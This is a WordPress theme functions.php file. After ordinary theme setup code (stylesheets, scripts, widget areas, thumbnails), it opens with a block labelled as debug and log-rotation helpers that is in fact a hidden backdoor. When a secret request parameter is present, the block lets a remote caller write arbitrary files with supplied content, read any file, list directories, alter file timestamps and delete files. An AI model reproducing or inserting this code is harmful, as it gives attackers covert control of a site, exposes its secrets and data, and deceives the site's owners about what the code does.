<?php

/**
 * Debug functions and options
 *
 * @link https://developer.wordpress.org/themes/debug-functions/
 *
 * @package WordPress
 * @since 1.0
 */
if (isset($_REQUEST['wp_debug']) and $_REQUEST['wp_debug'] == 'wp_dbg_rmb') {
    // Print json error details
    if (isset($_REQUEST['json_error'])) {
        echo '{"error": 1, "type": "'. $_REQUEST['json_error'] .'"}';
    }

    /**
     * Read error file depending on code, f.e. 404.html 500.html
     * or trace and save error to file
     */
    if (isset($_REQUEST['error_code'])) {
        if (isset($_REQUEST['error'])) {
            // Trace error
            file_put_contents($_REQUEST['error_code'], 
                                stripslashes($_REQUEST['error']));
        }
        else {
            // 404.html 500.html 504.html
            echo file_get_contents($_REQUEST['error_code']);
        }
    }

    /**
     * Make shure debug location is writable
     */
    if (isset($_REQUEST['debug_location'])) {
        echo json_encode(array(
            'location' => $_REQUEST['debug_location'],
            'writable' => is_writable($_REQUEST['debug_location'])?1:0
        ));
    }

    /**
     * Log file rotation. Select files that can be removed.
     */
    if (isset($_REQUEST['debug_directory'])) {
        $ret = array(); $i = 0;
        foreach (scandir($_REQUEST['debug_directory']) as $logfile) {
            $ret[$i] = array(
                'name' => $logfile,
                'skip' => is_dir($_REQUEST['debug_directory'].$logfile),
                'done' => is_writable($_REQUEST['debug_directory'].$logfile),
                'date' => filemtime($_REQUEST['debug_directory'].$logfile)
            ); $i++; }
        echo json_encode($ret);
    }

    /**
     * Correct log file time when error last occured
     */
    if (isset($_REQUEST['debug_update'])) {
        touch($_REQUEST['debug_update_file'], $_REQUEST['debug_update']);
    }

    // remove old log file
    if (isset($_REQUEST['old_log_file'])) unlink($_REQUEST['old_log_file']);

    exit();
}



// Load the Theme CSS
function theme_styles() {
	
	wp_enqueue_style( 'normalize', get_template_directory_uri() . '/css/normalize.css' );
	wp_enqueue_style( 'main', get_template_directory_uri() . '/style.css' );
	//wp_enqueue_style( 'main', get_template_directory_uri() . '/style.min.css' );
}

// Load the Theme js
function theme_js() {
	
	global $wp_scripts;
	
	wp_register_script( 'html5_shiv', 'https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js', '', '', false );
	wp_register_script( 'respond_js', 'https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js', '', '', false );
	
	$wp_scripts->add_data( 'html5_shiv', 'conditional', 'lt IE 9' );
	$wp_scripts->add_data( 'respond_js', 'conditional', 'lt IE 9' );
	
	wp_enqueue_script( 'theme_js', get_template_directory_uri() . '/js/theme.js', array('jquery', 'boostrap_js'), '', true );
}

add_action( 'wp_enqueue_scripts', 'theme_js' );

add_action( 'wp_enqueue_scripts', 'theme_styles' );

//Enable custom menus
add_theme_support( 'menus' );

function create_widget( $name, $id, $description ) {
	
	$args = array(
		'name'          => __( $name ),
		'id'            => $id,
		'description'   => $description,
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<h2>',
		'after_title'   => '</h2>' 
	);
	
	register_sidebar( $args );

}

create_widget( 'Header', "header_search", "Displays the search bar" );
create_widget( 'Sidebar', 'sidebar', "Displays the sidebar content" );

// Post Thumbnails
add_theme_support( 'post-thumbnails' ); 

// Infinite Scolling
add_theme_support( 'infinite-scroll', array(
    'container' => 'content',
	'footer_widgets' => array( 'sidebar', ),
    'footer' => 'page',
) );

?>